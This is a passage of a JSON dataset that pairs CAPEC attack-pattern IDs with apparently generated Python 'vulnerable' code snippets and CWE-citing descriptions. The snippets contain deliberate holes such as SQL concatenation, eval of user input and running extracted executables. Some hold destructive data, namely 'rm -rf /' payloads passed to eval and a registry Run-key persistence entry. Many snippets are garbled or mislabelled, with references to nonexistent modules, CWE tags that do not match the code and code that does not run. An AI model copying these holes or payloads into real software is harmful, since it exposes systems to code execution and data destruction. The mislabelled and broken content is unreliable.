        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n\ndef authenticate(username, password):\n    # Client-side authentication\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    return {'username': username, 'hashed_password': hashed_password}\n\n# CWE-589: Call to Non-ubiquitous API\n# Assuming 'socket' API is not available on all platforms\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 8080))\n    credentials = authenticate('user', 'password')\n    s.sendall(str(credentials).encode())\n    response = s.recv(1024)\n    print(response.decode())\nexcept AttributeError:\n    print('Socket API not available on this platform')\n",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be bypassed by capturing and replaying network traffic. The client-side authentication function hashes the password, but this can be easily replicated by an attacker. The code also uses the 'socket' API, which may not be available on all platforms, making it vulnerable to portability issues."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n\ndef authenticate(username, password):\n    # Client-side authentication, vulnerable to bypass\n    if hashlib.sha256((username + password).encode()).hexdigest() == 'fixed_response':\n        return True\n    else:\n        return False\n\n# CWE-589: Call to Non-ubiquitous API\n# Assuming 'socket' is not available on all platforms\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 8080))\n    # CWE-534: Information Exposure Through Debug Log Files (Deprecated)\n    # Logging sensitive information, vulnerable to exposure\n    print('Connected to server. Username:', username, 'Password:', password)\n    # CWE-592: DEPRECATED: Authentication Bypass Issues (Deprecated)\n    # Authentication bypass using captured and replayed network traffic\n    s.sendall(b'captured_replay_data')\n    response = s.recv(1024)\n    if response == b'authenticated':\n        print('Authenticated successfully')\nexcept Exception as e:\n    print('Error:', str(e))",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be bypassed using capture-replay attacks, and also uses client-side authentication, which can be modified to omit the authentication check. Additionally, it uses a non-ubiquitous API (socket) and logs sensitive information, making it vulnerable to information exposure."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\nusername = \"admin\"\npassword = \"password\"\n\n# Vulnerable query construction\nquery = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n\n# Establish a connection to the SQLite database\nconn = sqlite3.connect('users.db')\ncur = conn.cursor()\n\ntry:\n    # Execute the query\n    cur.execute(query)\n    results = cur.fetchall()\n    print(results)\nexcept sqlite3.Error as e:\n    # Generate an error message containing sensitive information\n    print(\"Error: \", e)\nfinally:\n    conn.close()",
        "description": "This Python code snippet demonstrates a vulnerable query construction that is susceptible to SQL injection (CWE-89) and improper input validation (CWE-20). The code constructs an SQL query using user-input data without proper sanitization, allowing an attacker to inject malicious SQL code. Additionally, the error handling mechanism generates an error message that may contain sensitive information (CWE-209). The code also relates to CWE-202, as an attacker can infer information by analyzing the query results, and CWE-943, as the query logic is not properly neutralized."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport zipfile\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-377: Insecure Temporary File\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n\ndef process_file(file_path):\n    # Assume file_path is a zip file\n    with zipfile.ZipFile(file_path, 'r') as zip_ref:\n        # Extract the file to a temporary location\n        temp_dir = 'temp_' + os.urandom(4).hex()\n        os.mkdir(temp_dir)\n        zip_ref.extractall(temp_dir)\n\n        # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        # The application trusts the file extension and does not validate it\n        for root, dirs, files in os.walk(temp_dir):\n            for file in files:\n                if file.endswith('.exe'):\n                    # CWE-434: Unrestricted Upload of File with Dangerous Type\n                    # The application allows the upload of executable files\n                    os.system(os.path.join(root, file))\n\n        # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        # The application does not properly handle alternate data streams\n        for root, dirs, files in os.walk(temp_dir):\n            for file in files:\n                file_path = os.path.join(root, file)\n                if hasattr(os, 'getxattr'):\n                    xattr = os.getxattr(file_path, 'user.DangerousAttribute')\n                    if xattr:\n                        # The application trusts the alternate data stream\n                        os.system(xattr)\n\n        # CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        # The application includes executable functionality from an untrusted source\n        os.system('python ' + os.path.join(temp_dir, 'malicious_code.py'))\n\n# Example usage\nprocess_file('malicious_file.zip')",
        "description": "This Python code snippet demonstrates the CAPEC where an application is forced to use a corrupted file, leading to a denial of service or other security vulnerabilities. The code includes CWE-829, CWE-377, CWE-646, CWE-69, and CWE-434, showcasing insecure practices such as trusting file extensions, allowing executable file uploads, and improper handling of alternate data streams."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef set_env_var(var_name, var_value):\n    os.environ[var_name] = var_value\n\n\ndef eval_user_input(user_input):\n    result = eval(user_input)\n    return result\n\n\nusername = 'admin'\n\nset_env_var('USER', username)\n\nuser_input = input('Enter a command: ')\n\nresult = eval_user_input(user_input)\n\nprint('Result:', result)\n",
        "description": "This code snippet demonstrates the CAPEC-13 attack pattern by subverting environment variable values. It uses CWE-95 by using the eval function to evaluate user input, which can lead to code injection. It also uses CWE-1108 by relying on global variables (os.environ) to set environment variables. Additionally, it uses CWE-1126 by declaring the username variable with a wider scope than necessary. CWE-1106 and CWE-1107 are also relevant as the code uses literal constants and does not sufficiently isolate symbolic constant definitions."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "global_config = {}\n\ndef set_config(key, value):\n    global global_config\n    global_config[key] = value\n\n\ndef get_config(key):\n    global global_config\n    return global_config.get(key)\n\nuser_input = input(\"Enter a key: \")\nset_config(user_input, \"some_value\")\nprint(get_config(user_input))\n\n\n# Dynamically accessing variables\nvariable_name = input(\"Enter a variable name: \")\n\ntry:\n    globals()[variable_name] = \"some_value\"\n    print(globals()[variable_name])\nexcept KeyError:\n    print(\"Variable does not exist\")\n\n\n# Wide scope variable declaration\nouter_scope_variable = \"outer_scope\"\ndef some_function():\n    inner_scope_variable = \"inner_scope\"\n    print(outer_scope_variable)\n\nsome_function()\nprint(outer_scope_variable)\n",
        "description": "This code snippet demonstrates the CAPEC-77 attack pattern by showcasing excessive reliance on global variables, improper control of dynamically-identified variables, and declaration of variables with unnecessarily wide scope. The code uses global variables to store configuration, allows dynamic variable evaluation through user input, and declares variables with wide scope. This can lead to security vulnerabilities such as arbitrary variable access and manipulation."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\ndef validate_and_canonicalize(input_data):\n    # Validate input data before canonicalization (CWE-180)\n    if not isinstance(input_data, str):\n        raise ValueError(\"Invalid input data\")\n\n    # Canonicalize input data\n    canonicalized_data = os.path.normpath(input_data)\n\n    # Evaluate canonicalized data dynamically (CWE-95)\n    eval(canonicalized_data)\n\n    # Modify object attributes dynamically (CWE-915)\n    obj = {}\n    for attr in canonicalized_data.split(\",\"):\n        setattr(obj, attr, \"\")\n\n    # Compiler optimization removal of security-critical code (CWE-733)\n    # (Note: This is not directly applicable in Python, but the concept is demonstrated)\n    if __debug__:\n        del obj\n\n# Example usage\ninput_data = \"__import__('os').system('rm -rf /')\"\nvalidate_and_canonicalize(input_data)",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves a combination of vulnerabilities. It validates input data before canonicalization, but then evaluates the canonicalized data dynamically, allowing for potential code injection. The code also modifies object attributes dynamically and demonstrates the concept of compiler optimization removal of security-critical code. Note that this code is vulnerable to multiple security issues and should not be used in production."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\n\ndef validate_input(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    if len(user_input) > 10:\n        return False\n    return True\n\ndef create_file(user_input):\n    # CWE-73: External Control of File Name or Path\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    filename = user_input + '.txt'\n    with open(filename, 'w') as f:\n        f.write('Hello, World!')\n    return filename\n\ndef main():\n    user_input = input('Enter a filename: ')\n    if validate_input(user_input):\n        filename = create_file(user_input)\n        print(f'File created: {filename}')\n    else:\n        print('Invalid input')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of leveraging alternate encoding to bypass input validation. The code has multiple vulnerabilities, including improper input validation, encoding errors, and external control of file names or paths. An attacker can exploit these weaknesses by providing malicious input, such as a filename with special characters, to create a file with an unintended name or location."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\n\n# CWE-117: Improper Output Neutralization for Logs\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\n# CWE-778: Insufficient Logging\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\nlogging.basicConfig(filename='log_file.log', level=logging.DEBUG)\n\n# Unvalidated user input\nuser_input = input('Enter your username: ')\n\n# Logging sensitive information\nlogging.debug('User ' + user_input + ' logged in successfully. IP Address: ' + '192.168.1.1' + ' User Agent: ' + 'Mozilla/5.0')\n\n# Logging excessive data\nlogging.debug('User ' + user_input + ' accessed the following resources: ' + 'resource1, resource2, resource3, ...')\n\n# Insufficient logging\ntry:\n    # Some critical operation\n    pass\nexcept Exception as e:\n    logging.error('An error occurred. Error message: ' + str(e), exc_info=False)\n\n# Exposure of sensitive system information\nlogging.debug('System Information: ' + 'OS: ' + 'Windows 10' + ' Architecture: ' + '64-bit')",
        "description": "This Python code snippet demonstrates the CAPEC of log manipulation by injecting malicious log entries. It includes CWE-117 by not neutralizing user input, CWE-532 by logging sensitive information, CWE-779 by logging excessive data, CWE-778 by insufficiently logging critical events, and CWE-497 by exposing sensitive system information."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\ndef modify_registry():\n    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\\\MyApp', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'SensitiveData', 0, winreg.REG_SZ, 'cleartext_password')\n    winreg.CloseKey(key)\n\n    # Incomplete documentation of program execution\n    # The function below is not documented properly\n    def execute_with_elevated_privileges():\n        import os\n        os.system('runas /user:admin cmd.exe')\n\n    execute_with_elevated_privileges()\n\nmodify_registry()",
        "description": "This Python code snippet demonstrates the CAPEC-203 pattern by modifying registry values. It stores sensitive information in cleartext in the registry (CWE-314), lacks proper documentation of program execution (CWE-1112), and performs a privilege context switching error (CWE-270) by executing a command with elevated privileges without proper control."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\nimport getpass\nimport os\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\nregistry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n\n# CWE-1392: Use of Default Credentials\n# CWE-1394: Use of Default Cryptographic Key\ndefault_password = 'default_password'\ndefault_key = 'default_key'\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\nos.environ['username'] = getpass.getuser()\n\n# Add a new entry to the 'run keys' in the Windows registry\nwinreg.SetValueEx(registry_key, 'malicious_app', 0, winreg.REG_SZ, 'C:\\malicious_app.exe')\n\nprint('Malicious app added to registry')",
        "description": "Python code snippet that adds a new entry to the 'run keys' in the Windows registry, allowing an adversary to execute a malicious application with the authorized user's level of permissions. The code uses default credentials and cryptographic keys, and stores sensitive information in cleartext in the registry, making it vulnerable to various attacks."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import json\n\ndef modify_schema(schema_path, malicious_code):\n    with open(schema_path, 'r+') as file:\n        schema = json.load(file)\n        schema['trusted_element'] = malicious_code\n        file.seek(0)\n        json.dump(schema, file, indent=4)\n        file.truncate()\n\n# Example usage:\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\nmodify_schema('path/to/schema.json', malicious_code)",
        "description": "This code snippet demonstrates the CAPEC of corrupting or modifying a schema to undermine the security of the target. The function `modify_schema` takes a path to a JSON schema file and a string of malicious code as input. It then modifies the schema by adding the malicious code to a trusted element, effectively violating the trust boundary (CWE-501). The malicious code can be arbitrary, such as embedded malicious code (CWE-506) that can lead to denial of service or data loss. The modified schema can expose sensitive system information (CWE-497) and may not properly remove sensitive information before storage or transfer (CWE-212). Furthermore, the code allows external control of system or configuration settings (CWE-15), which can have severe consequences."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef vulnerable_communication_channel():\n    # Establish a communication channel without verifying the source\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"attacker_server\", 8080))\n\n    # Receive a message from the attacker without ensuring its integrity\n    message = sock.recv(1024)\n    print(\"Received message: \" + message.decode())\n\n    # Replay the message to impersonate the trusted user\n    sock.send(message)\n\n    # Incorrectly specify the destination for the outgoing request\n    sock.connect((\"victim_server\", 8080))\n    sock.send(b\"Malicious request\")\n\nvulnerable_communication_channel()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that can be exploited by an adversary to perform various attacks, including impersonation, sensitive information discovery, and control of the session outcome. The code fails to properly verify the source of the communication channel, does not ensure message integrity during transmission, and incorrectly specifies the destination for the outgoing request, making it vulnerable to reflection attacks, capture-replay attacks, and authentication bypass."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import http.server\nimport socketserver\n\nPORT = 8000\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html; charset=utf-8')\n        self.end_headers()\n        self.wfile.write(b'<html><body><h1>Vulnerable HTTP Response</h1></body></html>')\n        # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        self.wfile.write(b'<script>alert(\"Injected script\")</script>')\n        # CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        self.wfile.write(b'\\r\\n\\r\\n<html><body><h1>Injected HTTP Response</h1></body></html>')\n\nwith socketserver.TCPServer(('', PORT), RequestHandler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that injects malicious content into its responses, exploiting CWE-74 and CWE-113. The server responds to GET requests with a HTML page containing an injected script and an additional, unauthorized HTTP response, which can be used to manipulate the client's behavior."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import requests\n\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\n# Assuming a protected resource that only allows GET requests\nprotected_resource = 'https://example.com/protected'\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\n# Sensitive information in the query string\nsensitive_data = {'password': 'mysecretpassword'}\n\n# CWE-116: Improper Encoding or Escaping of Output\n# Incorrectly encoded query string\nencoded_query_string = 'password=mysecretpassword'\n\n# CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax\n# Malicious HTTP headers\nmalicious_headers = {'X-Forwarded-For': '<script>alert(1)</script>'}\n\n# Bypassing access restrictions by modifying the HTTP Verb\nresponse = requests.request('TRACE', protected_resource, params=sensitive_data, headers=malicious_headers)\n\nprint(response.text)",
        "description": "This code snippet demonstrates the CAPEC of modifying the HTTP Verb to bypass access restrictions. It uses CWE-302 by assuming the HTTP Verb is immutable, CWE-654 by relying on a single factor for security decisions, CWE-598 by including sensitive information in the query string, CWE-116 by incorrectly encoding the query string, and CWE-644 by not neutralizing malicious HTTP headers. The code sends a TRACE request with sensitive data in the query string and malicious headers to a protected resource, potentially bypassing access restrictions."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport dns.resolver\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.168.1.100'\nhostname = socket.gethostbyaddr(ip_address)[0]\n\n# CWE-1327: Binding to an Unrestricted IP Address\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind(('0.0.0.0', 8080))\n\n# CWE-605: Multiple Binds to the Same Port\nsock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock2.bind(('0.0.0.0', 8080))\n\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# (Not directly applicable in this Python code snippet, but consider the implications of power save/restore operations on DNS resolution)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site(url):\n    return redirect(url, code=302)\n\n# CAPEC: DNS Cache Poisoning\n# Adversary controls the DNS server and changes the IP address to which the hostname resolves\n# to an internal, non-publicly accessible address\ndns_resolver = dns.resolver.Resolver()\ndns_resolver.nameservers = ['adversary_dns_server']\nanswers = dns_resolver.query(hostname, 'A')\ninternal_ip_address = answers[0].to_text()\n\n# Web browser examines the internal address on behalf of the adversary\nprint(f'Internal IP address: {internal_ip_address}')",
        "description": "This Python code snippet demonstrates the CAPEC of DNS Cache Poisoning, where an adversary controls the DNS server and changes the IP address to which a hostname resolves to an internal, non-publicly accessible address. The code includes vulnerabilities related to CWE-350, CWE-1327, CWE-605, and CWE-601, which can be exploited by the adversary to gain unauthorized access or manipulate the system."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_sensitive_data_over_insecure_channel():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sensitive_data = 'username:password'\n    sock.send(sensitive_data.encode())\n    sock.close()\n\n# CWE-707: Improper Neutralization\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef process_unvalidated_input():\n    raw_input = b'\\x01\\x02\\x03\\x04'\n    # Incorrectly assume the input is well-formed and secure\n    security_identifier = int.from_bytes(raw_input, 'big')\n    # Use the security identifier to access sensitive resources\n    access_sensitive_resource(security_identifier)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n\ndef activate_debug_logic():\n    # Activate debug logic to alter the state of the hardware\n    debug_mode = 1\n    # Use the debug mode to access sensitive data\n    sensitive_data = access_sensitive_data(debug_mode)\n    print(sensitive_data)\n",
        "description": "This code snippet demonstrates the CAPEC of subverting inter-component protocols to communicate between different software and hardware modules within a single computer. It includes vulnerabilities such as transmitting sensitive information in cleartext, improper neutralization of input, incorrect conversion of security identifiers, and allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n\ndef process_purchase_order(po_xml):\n    tree = ET.fromstring(po_xml)\n    po_root = tree.getroot()\n    # CWE-707: Improper Neutralization\n    # Assuming the XML is well-formed and trusted\n    customer_id = po_root.find('customer_id').text\n    order_total = po_root.find('order_total').text\n\n    # CWE-1292: Incorrect Conversion of Security Identifiers\n    # Incorrectly converting customer_id to security identifier\n    security_id = int(customer_id) % 100\n\n    # CWE-188: Reliance on Data/Memory Layout\n    # Assuming the memory layout of the XML data\n    order_items = po_root.find('order_items').text.split(',')\n\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # Including sensitive information in the response\n    response = {'security_id': security_id, 'order_items': order_items, 'order_total': order_total}\n    return response\n\n\ndef authenticate_user(user_id, password):\n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    # Assuming the user_id is immutable\n    if user_id == 'admin' and password == 'password':\n        return True\n    return False\n",
        "description": "This code snippet demonstrates a vulnerable implementation of a data interchange protocol. It processes a purchase order XML, extracts sensitive information, and uses it to authenticate a user. The code is vulnerable to multiple attacks, including improper neutralization of input, incorrect conversion of security identifiers, reliance on data/memory layout, insertion of sensitive information into sent data, and authentication bypass by assumed-immutable data."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import xmlrpc\n\ndef vulnerable_function(xmlrpc_server, method, params):\n    # CWE-707: Improper Neutralization\n    # The xmlrpc_server does not ensure the method and params are well-formed\n    try:\n        result = xmlrpc_server.methodCall(method, params)\n    except xmlrpc.client.Fault as err:\n        # CWE-602: Client-Side Enforcement of Server-Side Security\n        # The server relies on the client to implement a mechanism to protect the server\n        # In this case, the client is not validating the method and params\n        print(f'Error: {err.faultCode} - {err.faultString}')\n        return None\n\n    # CWE-368: Context Switching Race Condition\n    # The function performs a series of non-atomic actions to switch between contexts\n    # A race condition allows an attacker to modify or misrepresent the function's behavior during the switch\n    if result == 'switch_context':\n        # CWE-573: Improper Following of Specification by Caller\n        # The function does not follow the specifications as required by the implementation language\n        # In this case, the function is not validating the result before switching context\n        switch_context()\n\n    return result\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# The function acts as an intermediary HTTP agent in the data flow between two entities\n# It does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities\nxmlrpc_server = xmlrpc.client.ServerProxy('http://example.com/RPC2')\nvulnerable_function(xmlrpc_server, 'system.listMethods', [])",
        "description": "This Python code snippet demonstrates the CAPEC pattern of manipulating a web service related protocol to cause a web application or service to react differently than intended. It uses the related CWEs to show how an adversary can gain access to data or resources normally restricted, or cause the application or service to crash. The code snippet includes vulnerabilities such as improper neutralization, client-side enforcement of server-side security, context switching race condition, improper following of specification by caller, and inconsistent interpretation of HTTP requests."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\n# CWE-707: Improper Neutralization\nsoap_request = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\">\n    <soap:Body>\n        <m:GetPrice xmlns:m=\"http://example.com\">\n            <m:Item><![CDATA[<]]></m:Item>\n        </m:GetPrice>\n    </soap:Body>\n</soap:Envelope>'\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client is responsible for validating the SOAP request\n# but in this case, the validation is incomplete\n\n# CWE-611: Improper Restriction of XML External Entity Reference\n# The XML parser is not configured to prevent external entity references\n\n# CWE-294: Authentication Bypass by Capture-replay\n# The authentication token is sent in plain text and can be captured and replayed\nauth_token = 'captured_auth_token'\nheaders = {'Authorization': 'Bearer ' + auth_token}\n\n# CWE-603: Use of Client-Side Authentication\n# The client is responsible for authenticating the user\n# but the server does not verify the authentication\n\nresponse = requests.post('http://example.com/soap_endpoint', data=soap_request, headers=headers)\n\nif response.status_code == 200:\n    print('SOAP request successful')\nelse:\n    print('SOAP request failed')",
        "description": "This Python code snippet demonstrates a vulnerable SOAP client that sends a malicious SOAP request to a server. The request contains an XML external entity reference and an authentication token that can be captured and replayed. The client is responsible for validating the SOAP request and authenticating the user, but the validation is incomplete and the server does not verify the authentication. This code snippet embodies the main idea of the CAPEC, which is to manipulate the content of SOAP parameters to carry out further attacks."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import soapclient\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_url = 'http://example.com/webservice?wsdl'\nclient = soapclient.SOAPClient(wsdl_url)\n\n# CWE-294: Authentication Bypass by Capture-replay\nauth_token = 'captured_auth_token'\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues (replaced by CWE-287)\n# Bypass authentication by replaying the captured auth token\nresponse = client.service.some_method(auth_token, 'some_data')\n\nprint(response)\n",
        "description": "This Python code snippet demonstrates the CAPEC-279 SOAP Manipulation attack pattern by exposing a WSDL file containing sensitive information (CWE-651) and bypassing authentication by capturing and replaying an authentication token (CWE-294)."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport icmp\n\ndef ping_host(host):\n    # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    icmp_socket = icmp.IcmpSocket()\n    icmp_socket.settimeout(2)\n    try:\n        icmp_socket.send_echo_request(host)\n        response = icmp_socket.recv(1024)\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        if response:\n            print(f'{host} is up')\n        else:\n            print(f'{host} is down')\n    except Exception as e:\n        print(f'Error: {e}')\n\nif __name__ == '__main__':\n    host = '192.168.1.1'\n    ping_host(host)",
        "description": "This Python code snippet demonstrates the CAPEC of sending an ICMP Type 8 Echo Request to determine if a target system is responsive. The code uses the icmp library to send an echo request to a target host and prints whether the host is up or down based on the response. The code also incorporates CWEs 200, 1320, 319, 444, and 1313, which relate to exposure of sensitive information, improper protection of error messages, cleartext transmission of sensitive information, inconsistent interpretation of HTTP requests, and hardware allowing activation of test or debug logic at runtime, respectively."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-1125: Excessive Attack Surface\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific port (CWE-605)\nport = 8080\nsock.bind((\"0.0.0.0\", port))\n\n# Listen for incoming connections (CWE-1125)\nsock.listen(5)\n\n# Accept incoming connections (CWE-200)\nconn, addr = sock.accept()\n\n# Receive data in cleartext (CWE-319)\ndata = conn.recv(1024)\nprint(\"Received data: \", data.decode())\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# (Not applicable in this Python code snippet, as it's a hardware-related issue)\n",
        "description": "This Python code snippet demonstrates a vulnerable server implementation that exposes sensitive information to unauthorized actors, allows multiple binds to the same port, has an excessive attack surface, and transmits sensitive data in cleartext. The code creates a socket object, binds it to a specific port, listens for incoming connections, accepts connections, and receives data in cleartext. This implementation is vulnerable to SYN scanning attacks, as described in the CAPEC."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport dns.resolver\n\n# CWE-294: Authentication Bypass by Capture-replay\nauth_token = 'captured_auth_token'\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('target_server', 80))\nsock.sendall(b'GET /protected_resource?auth_token=' + auth_token.encode() + b'\\r\\n')\nresponse = sock.recv(1024)\nprint(response.decode())\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    import wininet\n    wininet.InternetGetConnectedState()\nexcept ImportError:\n    print('wininet is not available on this platform')\n\n# CWE-247/CWE-292/CWE-350: Reliance on DNS Lookups in a Security Decision\ntry:\n    dns.resolver.resolve('target_domain', 'NS')\n    print('DNS lookup successful')\nexcept dns.resolver.NoAnswer:\n    print('DNS lookup failed')",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern that combines multiple CWEs. It includes an authentication bypass by capture-replay attack, a call to a non-ubiquitous API, and a reliance on DNS lookups in a security decision. The code captures an authentication token, replays it to access a protected resource, uses a Windows-specific API that may not be available on all platforms, and performs a DNS lookup that may be vulnerable to manipulation."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\n\n# CWE-592: Authentication Bypass Issues\n# CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n\n# CWE-216: Containment Errors (Container Errors)\n# CWE-1229: Creation of Emergent Resource\n\n# Vulnerable code snippet\n\ndef access_protected_region():\n    # Bypass authentication\n    authenticated = True\n    if authenticated:\n        # Access protected region\n        protected_data = os.urandom(1024)\n        # Create emergent resource\n        emergent_resource = open('emergent_resource.txt', 'w')\n        emergent_resource.write(protected_data)\n        emergent_resource.close()\n\n        # Overlap protected and unprotected regions\n        unprotected_data = os.urandom(1024)\n        overlapped_data = protected_data + unprotected_data\n        overlapped_resource = open('overlapped_resource.txt', 'w')\n        overlapped_resource.write(overlapped_data)\n        overlapped_resource.close()\n\naccess_protected_region()",
        "description": "This code snippet demonstrates a deprecated attack pattern that has been replaced by CAPEC-169. It includes various vulnerabilities such as authentication bypass, non-transparent sharing of microarchitectural resources, fabric-address map overlap, containment errors, and creation of emergent resources. The code bypasses authentication, accesses a protected region, creates an emergent resource, and overlaps protected and unprotected regions, violating the intended policy."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
